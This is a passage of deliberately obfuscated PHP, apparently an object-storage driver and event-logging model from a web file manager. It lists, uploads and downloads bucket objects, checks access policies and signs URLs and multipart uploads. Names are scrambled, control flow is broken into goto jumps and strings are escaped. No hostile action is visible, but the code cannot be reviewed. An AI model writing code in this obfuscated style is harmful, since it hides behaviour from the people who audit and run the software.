$açœ˜’ŠÀ[$FŸÍÇƒä[74]][$a‹è¥¾ùøª] = $this->fileInfo($A‰Âğ„óÏì[$FŸÍÇƒä[28]], $fß¡„Å¿¥, $A‰Âğ„óÏì); } return $açœ˜’ŠÀ; } private function fileInfo($F’°¢‡İÔ, $bÎÚ”ƒì¤¥ = false, $FÎ¯÷½İç§ = array()) { goto BÅÁøØ«²Å; c§œÂ•ñš: if (isset($FÎ¯÷½İç§[$eÄÊßâ™³‡[197]])) { $D³¥¼‚øòë[$eÄÊßâ™³‡[84]] = $FÎ¯÷½İç§[$eÄÊßâ™³‡[197]]; } if (isset($FÎ¯÷½İç§[$eÄÊßâ™³‡[78]])) { $D³¥¼‚øòë[$eÄÊßâ™³‡[78]] = $FÎ¯÷½İç§[$eÄÊßâ™³‡[78]]; } return $D³¥¼‚øòë; goto Dî‘”Ì›¸; D†ä¨ŒßŒ‰: $D³¥¼‚øòë[$eÄÊßâ™³‡[194]] = $D³¥¼‚øòë[$eÄÊßâ™³‡[84]] = 0; $D³¥¼‚øòë[$eÄÊßâ™³‡[195]] = $D³¥¼‚øòë[$eÄÊßâ™³‡[196]] = !0; if (empty($FÎ¯÷½İç§)) { $FÎ¯÷½İç§ = $this->objectMeta($F’°¢‡İÔ); if (!$FÎ¯÷½İç§) { return $D³¥¼‚øòë; } } goto c§œÂ•ñš; BÅÁøØ«²Å: $eÄÊßâ™³‡ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $D³¥¼‚øòë = array($eÄÊßâ™³‡[28] => $this->pathThis($F’°¢‡İÔ), $eÄÊßâ™³‡[76] => $this->getPathOuter($F’°¢‡İÔ), $eÄÊßâ™³‡[29] => $eÄÊßâ™³‡[193], $eÄÊßâ™³‡[168] => $this->ext($F’°¢‡İÔ), $eÄÊßâ™³‡[78] => isset($FÎ¯÷½İç§[$eÄÊßâ™³‡[78]]) ? $FÎ¯÷½İç§[$eÄÊßâ™³‡[78]] : 0); if ($bÎÚ”ƒì¤¥) { return $D³¥¼‚øòë; } goto D†ä¨ŒßŒ‰; Dî‘”Ì›¸: } private function folderInfo($A‚½†ˆØŠ, $E±²Í’İÜá = false) { goto a¡‰’¬“«; c½Ïƒ„¥áÔ: $A‚½†ˆØŠ = trim($A‚½†ˆØŠ, $aŒ•…Ö…[8]) . $aŒ•…Ö…[8]; $fÃî¯µ³¡Ê = $this->objectMeta($A‚½†ˆØŠ); if (isset($fÃî¯µ³¡Ê[$aŒ•…Ö…[197]])) { $fÀ‘õ»Î¶[$aŒ•…Ö…[194]] = $fÃî¯µ³¡Ê[$aŒ•…Ö…[197]]; } goto A¤À½’·êß; E›æ±øâ¯´: $fÀ‘õ»Î¶[$aŒ•…Ö…[194]] = $fÀ‘õ»Î¶[$aŒ•…Ö…[84]] = 0; $fÀ‘õ»Î¶[$aŒ•…Ö…[195]] = $fÀ‘õ»Î¶[$aŒ•…Ö…[196]] = !0; if ($A‚½†ˆØŠ == $aŒ•…Ö…[33]) { return $fÀ‘õ»Î¶; } goto c½Ïƒ„¥áÔ; A¤À½’·êß: return $fÀ‘õ»Î¶; goto B¬é·Ù´İÓ; a¡‰’¬“«: $aŒ•…Ö… =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $fÀ‘õ»Î¶ = array($aŒ•…Ö…[28] => $this->pathThis($A‚½†ˆØŠ), $aŒ•…Ö…[76] => $this->getPathOuter($aŒ•…Ö…[8] . $A‚½†ˆØŠ), $aŒ•…Ö…[29] => $aŒ•…Ö…[77]); if ($E±²Í’İÜá) { return $fÀ‘õ»Î¶; } goto E›æ±øâ¯´; B¬é·Ù´İÓ: } private function fileList($D­ï™µ‰Œ, $DøÅĞäíòÄ = '', $F½±ö•„–° = 0) { goto Aï¾ùÍ‡ì»; EŠ©ˆå: if (!$C‚³¦‡Ó¡ê) { return array($B´‘ñÎ¸Ô[75] => array(), $B´‘ñÎ¸Ô[74] => array()); } $C‚¼ƒ¬ŸøÑ = $this->listItemCache === !1 ? !1 : !0; $bÊ•øâŞß¾ = $dŒìò¾÷ = array(); goto E÷ç³Ê¬¡Š; EÏñÒôğÃª: return array($B´‘ñÎ¸Ô[75] => $bÊ•øâŞß¾, $B´‘ñÎ¸Ô[74] => $dŒìò¾÷); goto B‰•¡ã—ÌŞ; Aï¾ùÍ‡ì»: $B´‘ñÎ¸Ô =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $EŒï‰Ù°ƒî = rtrim($D­ï™µ‰Œ, $B´‘ñÎ¸Ô[8]) . $B´‘ñÎ¸Ô[8]; $C‚³¦‡Ó¡ê = $this->listObjs($EŒï‰Ù°ƒî, null, null, $DøÅĞäíòÄ); goto EŠ©ˆå; E÷ç³Ê¬¡Š: foreach ($C‚³¦‡Ó¡ê[$B´‘ñÎ¸Ô[198]] as $DÃÓæ¸ĞÄ¹) { goto a‚ÕÁ¿Ìõã; a‚ÕÁ¿Ìõã: $a¢åùãÑñí = $DÃÓæ¸ĞÄ¹[$B´‘ñÎ¸Ô[28]]; if ($a¢åùãÑñí == $EŒï‰Ù°ƒî) { continue; } $A“š¡¨İ¨ë = isset($DÃÓæ¸ĞÄ¹[$B´‘ñÎ¸Ô[78]]) ? $DÃÓæ¸ĞÄ¹[$B´‘ñÎ¸Ô[78]] : 0; goto e‘Ãª‘Ğ¨ˆ; e‘Ãª‘Ğ¨ˆ: $fÀÉ·”‡Æ‚ = $A“š¡¨İ¨ë == 0 && substr($a¢åùãÑñí, strlen($a¢åùãÑñí) - 1, 1) == $B´‘ñÎ¸Ô[8] ? !0 : !1; if ($C‚¼ƒ¬ŸøÑ) { $this->cacheMethod($B´‘ñÎ¸Ô[199], $a¢åùãÑñí, $fÀÉ·”‡Æ‚); $this->cacheMethod($B´‘ñÎ¸Ô[200], $a¢åùãÑñí, $DÃÓæ¸ĞÄ¹); } if ($fÀÉ·”‡Æ‚) { $bÊ•øâŞß¾[] = $a¢åùãÑñí; continue; } goto E¶õÀÂ¢ŒÑ; E¶õÀÂ¢ŒÑ: $dŒìò¾÷[] = $F½±ö•„–° ? $DÃÓæ¸ĞÄ¹ : $a¢åùãÑñí; goto d‚³×†“„²; d‚³×†“„²: } foreach ($C‚³¦‡Ó¡ê[$B´‘ñÎ¸Ô[201]] as $DÃÓæ¸ĞÄ¹) { $bÊ•øâŞß¾[] = $DÃÓæ¸ĞÄ¹[$B´‘ñÎ¸Ô[28]]; if ($C‚¼ƒ¬ŸøÑ) { $this->cacheMethod($B´‘ñÎ¸Ô[199], $DÃÓæ¸ĞÄ¹[$B´‘ñÎ¸Ô[28]], !0); } } if ($C‚¼ƒ¬ŸøÑ) { $this->cacheMethod($B´‘ñÎ¸Ô[199], $D­ï™µ‰Œ, !0); } goto EÏñÒôğÃª; B‰•¡ã—ÌŞ: } private function listObjs($få¥¦´Ÿ´£, $Eï÷¯•Ø“˜ = null, $b¥÷˜íš¦ˆ = null, $fğï©ÍÁ¡¨ = null) { $F½Ñ£´·Ú =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $få¥¦´Ÿ´£ = trim($få¥¦´Ÿ´£, $F½Ñ£´·Ú[8]); $a‰æ¶…Ğ = empty($få¥¦´Ÿ´£) && $få¥¦´Ÿ´£ !== $F½Ñ£´·Ú[191] ? $F½Ñ£´·Ú[33] : $få¥¦´Ÿ´£ . $F½Ñ£´·Ú[8]; return $this->client->getBucket($this->bucket, $a‰æ¶…Ğ, $Eï÷¯•Ø“˜, $b¥÷˜íš¦ˆ, $fğï©ÍÁ¡¨, !0); } public function has($c…Æ±›·Ã‰, $F÷„ˆÃîà = false, $eÁŠƒÁÙÊ‰ = true) { goto f£ÊƒôºÈ­; d§ˆ»‡ù¥Í: $AæÜ÷‡¾¬å = null; $C¬ëšîê£À = 500; $AÎö×¡ïïÇ = $AœéÔ“[8]; goto a÷¹¹×óâ÷; a“Í…‘ö²­: return !1; goto cËÚñ†Ç…; a÷¹¹×óâ÷: $DÂ•º©ğ = $Fµ„Öšô… = array(); while (!0) { $DÉÈãÀÁÙ = $this->listObjs($c…Æ±›·Ã‰, $AæÜ÷‡¾¬å, $C¬ëšîê£À, $AÎö×¡ïïÇ); if (!$DÉÈãÀÁÙ) { break; } $AæÜ÷‡¾¬å = $DÉÈãÀÁÙ[$AœéÔ“[202]]; $BĞôŠĞ¶¬« = $DÉÈãÀÁÙ[$AœéÔ“[198]]; $BÅ³…âÑ– = $DÉÈãÀÁÙ[$AœéÔ“[201]]; if (empty($BĞôŠĞ¶¬«) && empty($BÅ³…âÑ–)) { break; } if (count($BĞôŠĞ¶¬«) == 1 && $BĞôŠĞ¶¬«[0][$AœéÔ“[28]] == $e“›İ£†°“) { break; } if ($F÷„ˆÃîà) { if (count($BĞôŠĞ¶¬«)) { $BĞôŠĞ¶¬« = array_column($BĞôŠĞ¶¬«, $AœéÔ“[28]); $DÂ•º©ğ = array_merge($DÂ•º©ğ, $BĞôŠĞ¶¬«); } if (count($BÅ³…âÑ–)) { $BÅ³…âÑ– = array_column($BÅ³…âÑ–, $AœéÔ“[28]); $Fµ„Öšô… = array_merge($Fµ„Öšô…, $BÅ³…âÑ–); } if ($AæÜ÷‡¾¬å === null) { break; } continue; } if ($eÁŠƒÁÙÊ‰) { if (!empty($BĞôŠĞ¶¬«)) { if (count($BĞôŠĞ¶¬«) > 1 || isset($BĞôŠĞ¶¬«[0][$AœéÔ“[28]]) && $BĞôŠĞ¶¬«[0][$AœéÔ“[28]] != $e“›İ£†°“) { return !0; } } } else { if (!empty($BÅ³…âÑ–)) { return !0; } } if ($AæÜ÷‡¾¬å === null) { break; } } if ($F÷„ˆÃîà) { $DÂ•º©ğ = array_diff($DÂ•º©ğ, array($e“›İ£†°“)); $DÂ•º©ğ = count(array_unique($DÂ•º©ğ)); $Fµ„Öšô… = count(array_unique($Fµ„Öšô…)); return array($AœéÔ“[203] => $DÂ•º©ğ, $AœéÔ“[204] => $Fµ„Öšô…); } goto a“Í…‘ö²­; f£ÊƒôºÈ­: $AœéÔ“ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $c…Æ±›·Ã‰ = trim($c…Æ±›·Ã‰, $AœéÔ“[8]); $e“›İ£†°“ = empty($c…Æ±›·Ã‰) && $c…Æ±›·Ã‰ !== $AœéÔ“[191] ? $AœéÔ“[33] : $c…Æ±›·Ã‰ . $AœéÔ“[8]; goto d§ˆ»‡ù¥Í; cËÚñ†Ç…: } public function listAll($a¹Ø¢×˜) { $EÀÊÒøĞàØ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $B•¸îÅ¹È‡ = $this->fileList($a¹Ø¢×˜, $EÀÊÒøĞàØ[33], !0); $fÏª‚÷·ä¼ = array(); foreach ($B•¸îÅ¹È‡[$EÀÊÒøĞàØ[74]] as $Eî´­¥ã) { $fÏª‚÷·ä¼[$Eî´­¥ã[$EÀÊÒøĞàØ[28]]] = $Eî´­¥ã[$EÀÊÒøĞàØ[78]]; } foreach ($B•¸îÅ¹È‡[$EÀÊÒøĞàØ[75]] as $Eî´­¥ã) { if (is_string($Eî´­¥ã)) { $fÏª‚÷·ä¼[$Eî´­¥ã] = 0; } } return $this->listAllFiles($a¹Ø¢×˜, array_keys($fÏª‚÷·ä¼), $fÏª‚÷·ä¼); } public function canRead($FŠÁÜ÷„†Ù) { $F›ö„ØšØ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $Béá˜ÆªŠ = $this->client->getAccessControlPolicy($this->bucket, $FŠÁÜ÷„†Ù); if (!$Béá˜ÆªŠ) { return !1; } return in_array($Béá˜ÆªŠ, array($F›ö„ØšØ[205], $F›ö„ØšØ[206], $F›ö„ØšØ[207])) ? !0 : !1; } public function canWrite($Dî¥„è§¾Ş) { $bõ½ËŠ„ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $f²œÑ¯‡³ = $this->client->getAccessControlPolicy($this->bucket, $Dî¥„è§¾Ş); if (!$f²œÑ¯‡³) { return !1; } return in_array($f²œÑ¯‡³, array($bõ½ËŠ„[205], $bõ½ËŠ„[206])) ? !0 : !1; } public function getContent($E»Êœæ…­Å) { return $this->client->getObject($this->bucket, $E»Êœæ…­Å); } public function setContent($AÎš—¿Ä¨¤, $F·•£×İ¡¼ = '', $BƒóÄíñ»Ğ = false) { goto cé¾¡¬ö‘; AÏøÀæÁˆÈ: $this->cacheMethod(null, null); $B÷‹¨Û¯¨ = $this->copyFile($AÎš—¿Ä¨¤, $AÎš—¿Ä¨¤, array($AğÂËÅ‚ÊÓ[208] => $B÷‹¨Û¯¨[$AğÂËÅ‚ÊÓ[209]])); return $B÷‹¨Û¯¨ ? !0 : !1; goto aÔùÄƒ¯ˆ; cé¾¡¬ö‘: $AğÂËÅ‚ÊÓ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $AÎš—¿Ä¨¤ = $BƒóÄíñ»Ğ ? trim($AÎš—¿Ä¨¤, $AğÂËÅ‚ÊÓ[8]) . $AğÂËÅ‚ÊÓ[8] : $AÎš—¿Ä¨¤; $CãŒëë¥½Í = get_file_mime(get_path_ext($AÎš—¿Ä¨¤)); goto d°¢Ô”Ğãí; d°¢Ô”Ğãí: $B÷‹¨Û¯¨ = $this->client->putObject($F·•£×İ¡¼, $this->bucket, $AÎš—¿Ä¨¤, $AğÂËÅ‚ÊÓ[192], array(), $CãŒëë¥½Í); if (!$B÷‹¨Û¯¨) { return !1; } if ($BƒóÄíñ»Ğ) { return !0; } goto AÏøÀæÁˆÈ; aÔùÄƒ¯ˆ: } public function fileSubstr($Cˆ¸° ŠÊ¬, $b™’³Ü™ğ, $f­˜öÖÊ®) { $e·¼ğ‘¿ = $b™’³Ü™ğ + $f­˜öÖÊ® - 1; return $this->client->getObject($this->bucket, $Cˆ¸° ŠÊ¬, array($_SERVER[Ôğ—¤Šµˆ˜ñ£][210] => "\142\x79\x74\x65\163\x3d{$b™’³Ü™ğ}\55{$e·¼ğ‘¿}")); } public function upload($bÈ†å¡ãß…, $fî¶À–çø÷, $fÁ“ï­çƒÄ = false, $aÇÛ³ ¢êõ = REPEAT_REPLACE) { $AÜÍğ—¨„‘ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $aƒËŒ›·Âß = array($AÜÍğ—¨„‘[208] => @md5_file($fî¶À–çø÷)); $cÙ›®ŸÚğñ = array($AÜÍğ—¨„‘[211] => get_file_mime(get_path_ext($bÈ†å¡ãß…))); if (IO::size($fî¶À–çø÷) <= 1024 * 1024 * 200) { $EùÄôùÀ¢Ó = $this->client->putObjectFile($fî¶À–çø÷, $this->bucket, $bÈ†å¡ãß…, $AÜÍğ—¨„‘[192], $aƒËŒ›·Âß, $cÙ›®ŸÚğñ); return !empty($EùÄôùÀ¢Ó) ? $this->getPathOuter($bÈ†å¡ãß…) : !1; } $Dô¡æ×îê = $this->client->multiUploadObject($fî¶À–çø÷, $this->bucket, trim($bÈ†å¡ãß…, $AÜÍğ—¨„‘[8]), $aƒËŒ›·Âß, $cÙ›®ŸÚğñ); return $Dô¡æ×îê ? $this->getPathOuter($bÈ†å¡ãß…) : !1; } public function download($aÓŸ•…Ø¢, $F½±›ÚÖÑ‡) { if (!@is_dir($this->pathFather($F½±›ÚÖÑ‡)) && !IO::mkdir($this->pathFather($F½±›ÚÖÑ‡))) { return !1; } $aˆĞ´˜Ê¬ = $this->client->getObject($this->bucket, $aÓŸ•…Ø¢, array(), $F½±›ÚÖÑ‡); return $aˆĞ´˜Ê¬ !== !1 ? $F½±›ÚÖÑ‡ : !1; } public function link($E²‰êÒå—, $D‰º‘š‚¢Í = array()) { $Dê•“¯œË… =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($this->signVer == $Dê•“¯œË…[212]) { return $this->client->getAuthenticatedURL($this->bucket, $E²‰êÒå—, 3600 * 12, $D‰º‘š‚¢Í); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($E²‰êÒå—, $Dê•“¯œË…[8]), 3600 * 12, $this->region, array(), !0, $D‰º‘š‚¢Í); } public function fileOut($C‘É¤ô±Ç—, $f„˜ì™ = false, $B¬ë£ÌĞ¦¨ = false, $B¯ ßÂÊ¨Ë = '') { goto A‘·ô¹­˜ ; A‚Ÿ‹ƒ•’¢: $CŒ²ñ­÷óê = get_file_mime(get_path_ext($B¬ë£ÌĞ¦¨)); if ($CŒ²ñ­÷óê == $e³¾ÏÃ[213]) { return parent::fileOut($C‘É¤ô±Ç—, $f„˜ì™, $B¬ë£ÌĞ¦¨, $B¯ ßÂÊ¨Ë); } $f„˜ì™ = $f„˜ì™ ? $e³¾ÏÃ[214] : $e³¾ÏÃ[215]; goto FœË„¸‹Ø; FœË„¸‹Ø: $bÅÜßÊ˜ÈÙ = array($e³¾ÏÃ[216] => $f„˜ì™ . $e³¾ÏÃ[217] . rawurlencode($B¬ë£ÌĞ¦¨), $e³¾ÏÃ[218] => $CŒ²ñ­÷óê); $cÆÄ«ñ£¾Ï = $this->link($C‘É¤ô±Ç—, $bÅÜßÊ˜ÈÙ); $this->fileOutLink($cÆÄ«ñ£¾Ï); goto dÑè³ğ‹ò; A‘·ô¹­˜ : $e³¾ÏÃ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($this->isFileOutServer()) { return $this->fileOutServer($C‘É¤ô±Ç—, $f„˜ì™, $B¬ë£ÌĞ¦¨, $B¯ ßÂÊ¨Ë); } if (!$B¬ë£ÌĞ¦¨) { $B¬ë£ÌĞ¦¨ = $this->pathThis($C‘É¤ô±Ç—); } goto A‚Ÿ‹ƒ•’¢; dÑè³ğ‹ò: } public function fileOutServer($cÈã’Ü¨©Í, $AÜÅ•‹ï“Ö = false, $A…ÔØö§±ñ = false, $dİò‘‰ƒŞá = '') { parent::fileOut($cÈã’Ü¨©Í, $AÜÅ•‹ï“Ö, $A…ÔØö§±ñ, $dİò‘‰ƒŞá); } public function fileOutImageServer($Aß”À•š¢, $fÕÔñ£ìö = 250) { parent::fileOutImage($Aß”À•š¢, $fÕÔñ£ìö); } public function hashMd5($B½©Ÿ¹Şå­, $f©ÌÔøŒ‹ = '') { $bÂ¶¬ààÍ„ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $eÎ¼÷´â¬Ø = $this->objectMeta($B½©Ÿ¹Şå­); if (!$eÎ¼÷´â¬Ø) { return !1; } $f©ÌÔøŒ‹ = $f©ÌÔøŒ‹ ? $f©ÌÔøŒ‹ : _get($eÎ¼÷´â¬Ø, $bÂ¶¬ààÍ„[219]); $f©ÌÔøŒ‹ = $f©ÌÔøŒ‹ ? $f©ÌÔøŒ‹ : _get($eÎ¼÷´â¬Ø, $bÂ¶¬ààÍ„[209], $bÂ¶¬ààÍ„[33]); return $f©ÌÔøŒ‹; } public function uploadFormData($cì³Ø¸ÍÎ, $bìÚ¨¦Š»š = 3600) { $aÈ£ØÉŒ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $côå¾ò¼œ‘ = $this->pathFather($cì³Ø¸ÍÎ); $D£‚¼áƒ†œ = $this->client->getHttpUploadPostParams($this->bucket, $côå¾ò¼œ‘, $aÈ£ØÉŒ[192], $bìÚ¨¦Š»š); return array_merge((array) $D£‚¼áƒ†œ, array($aÈ£ØÉŒ[175] => $this->getHost())); } public function multiUploadFormData($c•¸ÀáÔ, $bÓö¬Ä…ó = 3600) { $d†ˆ¿°‡ø¹ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $Aôêïè·Ñ¨ = gmdate($d†ˆ¿°‡ø¹[220]); $f¬·¡–Ò¼ = array(); $FõóÙ¤ø¾™ = $this->client->getUploadId($this->bucket, $c•¸ÀáÔ, $f¬·¡–Ò¼); if (!$FõóÙ¤ø¾™) { return !1; } return array($d†ˆ¿°‡ø¹[221] => $FõóÙ¤ø¾™, $d†ˆ¿°‡ø¹[175] => $this->getHost() . $d†ˆ¿°‡ø¹[8] . $this->pathEncode($c•¸ÀáÔ), $d†ˆ¿°‡ø¹[222] => $Aôêïè·Ñ¨, $d†ˆ¿°‡ø¹[93] => $c•¸ÀáÔ); } public function multiUploadAuthData($f·•éÒˆˆä, $f®é™©Â§ = array()) { goto eˆäŞ–İ¯; eˆäŞ–İ¯: $AÌìáÄÆ»³ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $Dµ¥ŠÌ Ô = isset($f®é™©Â§[$AÌìáÄÆ»³[222]]) ? $f®é™©Â§[$AÌìáÄÆ»³[222]] : gmdate($AÌìáÄÆ»³[220]); $A‹Å’³¯‰§ = isset($f®é™©Â§[$AÌìáÄÆ»³[168]]) ? $f®é™©Â§[$AÌìáÄÆ»³[168]] : $AÌìáÄÆ»³[33]; goto c×·Á”›³; c³­Ï‘¶í: $C‡Âô™¾¿Ğ = implode($AÌìáÄÆ»³[229], $e·¿­Ø‹ÑÑ); $e´…Í Ä = base64_encode(hash_hmac($AÌìáÄÆ»³[230], $C‡Âô™¾¿Ğ, $this->secret, !0)); $C¹ÓÙÄ¼­¸ = $AÌìáÄÆ»³[231] . $this->accessKey . $AÌìáÄÆ»³[4] . $e´…Í Ä; goto A²İ·éÊİ¥; eëÉÍŸ¶Çæ: $e·¿­Ø‹ÑÑ = array($AÌìáÄÆ»³[224], $AÌìáÄÆ»³[33], $AÌìáÄÆ»³[119], $AÌìáÄÆ»³[33], "\x78\x2d\141\155\172\x2d\144\141\x74\x65\72{$Dµ¥ŠÌ Ô}", $AÌìáÄÆ»³[8] . $this->bucket . $AÌìáÄÆ»³[8] . $this->pathEncode($e—»ñòïæÕ) . $A‹Å’³¯‰§); if (strpos($A‹Å’³¯‰§, $AÌìáÄÆ»³[225]) === 0) { $e·¿­Ø‹ÑÑ[0] = $AÌìáÄÆ»³[226]; } if (isset($f®é™©Â§[$AÌìáÄÆ»³[227]]) && $f®é™©Â§[$AÌìáÄÆ»³[227]] == $AÌìáÄÆ»³[228]) { $e·¿­Ø‹ÑÑ[0] = $AÌìáÄÆ»³[228]; } goto c³­Ï‘¶í; A²İ·éÊİ¥: if (strpos($A‹Å’³¯‰§, $AÌìáÄÆ»³[225]) === 0) { return array($AÌìáÄÆ»³[232] => $C¹ÓÙÄ¼­¸, $AÌìáÄÆ»³[222] => $Dµ¥ŠÌ Ô); } return $C¹ÓÙÄ¼­¸; goto E¨ãÏÑæéÀ; c×·Á”›³: $e—»ñòïæÕ = $f®é™©Â§[$AÌìáÄÆ»³[93]]; unset($f®é™©Â§[$AÌìáÄÆ»³[93]]); if (isset($f®é™©Â§[$AÌìáÄÆ»³[223]])) { $f®é™©Â§[$AÌìáÄÆ»³[222]] = $Dµ¥ŠÌ Ô; return $this->listUploadParts($e—»ñòïæÕ, $f®é™©Â§); } goto eëÉÍŸ¶Çæ; E¨ãÏÑæéÀ: } public function listUploadParts($FÉ×±¯Üƒ†, $EÈµ‘é÷ = array()) { goto c¡ù‡¼È˜; c¡ù‡¼È˜: $A™‘Ã¿Õ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $E”¯±ŞÍåš = str_replace($A™‘Ã¿Õ[233], $A™‘Ã¿Õ[33], $EÈµ‘é÷[$A™‘Ã¿Õ[168]]); $eÉå‹ÏŠ÷ = $this->client->listParts($this->bucket, $FÉ×±¯Üƒ†, $E”¯±ŞÍåš); goto CÄÉÊø§ïÙ; a¬‹öˆ˜Ö: $f…»ŒÉ£ñ¯ = $this->multiUploadAuthData($FÉ×±¯Üƒ†, $EÈµ‘é÷); if (empty($f…»ŒÉ£ñ¯)) { return !1; } return array($A™‘Ã¿Õ[232] => $f…»ŒÉ£ñ¯, $A™‘Ã¿Õ[222] => $EÈµ‘é÷[$A™‘Ã¿Õ[222]], $A™‘Ã¿Õ[234] => $eÉå‹ÏŠ÷); goto FÅ›Ã¹„Ú±; CÄÉÊø§ïÙ: if (!$eÉå‹ÏŠ÷) { return !1; } unset($EÈµ‘é÷[$A™‘Ã¿Õ[223]], $EÈµ‘é÷[$A™‘Ã¿Õ[227]]); $EÈµ‘é÷[$A™‘Ã¿Õ[93]] = $FÉ×±¯Üƒ†; goto a¬‹öˆ˜Ö; FÅ›Ã¹„Ú±: } public function getHost() { return parent::getHost() . $_SERVER[Ôğ—¤Šµˆ˜ñ£][8] . $this->bucket; } public function size($CùÎ˜ªéÅê) { $fœ½²§ù­× = $this->objectMeta($CùÎ˜ªéÅê); return $fœ½²§ù­× ? $fœ½²§ù­×[$_SERVER[Ôğ—¤Šµˆ˜ñ£][78]] : 0; } public function info($FšÎÚ¼Ô‚) { if ($this->isFolder($FšÎÚ¼Ô‚)) { return $this->folderInfo($FšÎÚ¼Ô‚); } else { if ($this->isFile($FšÎÚ¼Ô‚)) { return $this->fileInfo($FšÎÚ¼Ô‚); } } return !1; } public function exist($f¿âÛÃêé) { return $this->isFile($f¿âÛÃêé) || $this->isFolder($f¿âÛÃêé); } public function isFile($b³µª„°„®) { return !$this->isFolder($b³µª„°„®) && $this->objectMeta($b³µª„°„®); } public function isFolder($D‰óÓãÑÎ—) { return $this->cacheMethod($_SERVER[Ôğ—¤Šµˆ˜ñ£][199], $D‰óÓãÑÎ—); } protected function objectMeta($d³®Ö¡†©) { return $this->cacheMethod($_SERVER[Ôğ—¤Šµˆ˜ñ£][200], $d³®Ö¡†©); } protected function _objectMeta($f¨‰•ª¼å†) { $Fò©ØŸŒğ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $f¨‰•ª¼å† = rtrim($f¨‰•ª¼å†, $Fò©ØŸŒğ[8]); try { $Fğà±¾ìë„ = $this->client->getObjectInfo($this->bucket, $f¨‰•ª¼å†); if (!isset($Fğà±¾ìë„[$Fò©ØŸŒğ[219]]) && isset($Fğà±¾ìë„[$Fò©ØŸŒğ[235]])) { $Fğà±¾ìë„[$Fò©ØŸŒğ[219]] = $Fğà±¾ìë„[$Fò©ØŸŒğ[235]]; } } catch (Exception $b®ÅÜÃ‚Å…) { $Fğà±¾ìë„ = !1; } if (!$Fğà±¾ìë„) { } return $Fğà±¾ìë„; } protected function _isFolder($e™ß‚ôõ×†) { goto Cµùã†·®; BŠ‹‡¶»¬Ì: return stripos($a£ ²­äÊ½, $e™ß‚ôõ×† . $Cá§¸Óİ”´[8]) === 0 ? !0 : !1; if (substr($a£ ²­äÊ½, -1) == $Cá§¸Óİ”´[8]) { return !0; } if (get_path_this($a£ ²­äÊ½) == get_path_this($e™ß‚ôõ×†)) { return !1; } goto AîÊØï•Ïó; C·ãÆ©¿„•: $bŒÉÍ’µÓ„ = $this->client->getBucket($this->bucket, $e™ß‚ôõ×†, null, 1); if (empty($bŒÉÍ’µÓ„[$Cá§¸Óİ”´[198]])) { return !1; } $a£ ²­äÊ½ = $bŒÉÍ’µÓ„[$Cá§¸Óİ”´[198]][0][$Cá§¸Óİ”´[28]]; goto BŠ‹‡¶»¬Ì; AîÊØï•Ïó: return !0; goto aæöšñº; Cµùã†·®: $Cá§¸Óİ”´ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $e™ß‚ôõ×† = rtrim($e™ß‚ôõ×†, $Cá§¸Óİ”´[8]); if ($e™ß‚ôõ×† == $Cá§¸Óİ”´[33] || $e™ß‚ôõ×† == $Cá§¸Óİ”´[8]) { return !0; } goto C·ãÆ©¿„•; aæöšñº: } } define($_SERVER[Ôğ—¤Šµˆ˜ñ£][236], 1); goto B«½™‡÷À„; eïóÎ¸ »ˆ: class SourceEventModel extends ModelBase { protected $tableName = "\151\157\x5f\163\x6f\165\162\x63\x65\x5f\x65\x76\145\x6e\164"; protected $dataAuto = array(array("\143\162\145\x61\x74\145\x54\151\155\x65", "\x74\151\155\145", "\151\156\x73\145\x72\164", "\x66\165\x6e\x63\x74\151\157\x6e"), array("\x64\145\x73\x63", '', "\x69\156\163\x65\x72\x74\x2c\x75\x70\144\x61\x74\x65\x2c\163\x65\154\x65\x63\164", "\152\x73\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($cœ«ÌŠÖ„ø, $D¦‡İ®ñëŒ, $F†ËŠ®øê… = '') { goto F°¥ËŠ™‡â; F°¥ËŠ™‡â: $E´¬™ò¯¬ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$this->eventSave) { return; } $f½È˜ğŞ‰¾ = Model($E´¬™ò¯¬[1227])->sourceInfo($cœ«ÌŠÖ„ø); goto EËœ¤‹À’‰; cä­‚”İ÷å: $AçÃôµ¸å = array($E´¬™ò¯¬[412] => $cœ«ÌŠÖ„ø, $E´¬™ò¯¬[1930] => $f½È˜ğŞ‰¾[$E´¬™ò¯¬[492]], $E´¬™ò¯¬[1931] => $f½È˜ğŞ‰¾[$E´¬™ò¯¬[28]], $E´¬™ò¯¬[513] => !empty($f½È˜ğŞ‰¾[$E´¬™ò¯¬[513]]) ? $f½È˜ğŞ‰¾[$E´¬™ò¯¬[513]] : $E´¬™ò¯¬[33], $E´¬™ò¯¬[1541] => USER_ID, $E´¬™ò¯¬[417] => $D¦‡İ®ñëŒ, $E´¬™ò¯¬[1543] => $F†ËŠ®øê…); $this->addSystemLog($D¦‡İ®ñëŒ, $AçÃôµ¸å); unset($AçÃôµ¸å[$E´¬™ò¯¬[1931]], $AçÃôµ¸å[$E´¬™ò¯¬[513]]); goto bÉ¸˜…ˆ±; bÉ¸˜…ˆ±: return $this->add($AçÃôµ¸å); goto eÀòëâÜ©„; EËœ¤‹À’‰: if (!$f½È˜ğŞ‰¾) { return !1; } if ($this->isCacheEvent($f½È˜ğŞ‰¾, $D¦‡İ®ñëŒ)) { return; } if ($F†ËŠ®øê… && is_string($F†ËŠ®øê…)) { $F†ËŠ®øê… = array($E´¬™ò¯¬[1757] => $F†ËŠ®øê…); } goto 